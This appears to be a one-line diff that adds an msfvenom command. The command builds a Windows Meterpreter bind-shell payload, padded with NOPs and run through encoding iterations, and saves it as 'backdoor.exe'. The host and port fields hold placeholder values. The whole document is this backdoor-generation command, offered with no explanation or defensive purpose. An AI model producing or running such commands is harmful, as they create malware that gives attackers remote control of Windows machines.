@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/bind_tcp LHOST=CH_Me LPORT=CH_Me --platform windows -a x64 -n 200 -e generic/none -i 4 -b "badchars" -f exe -o backdoor.exe
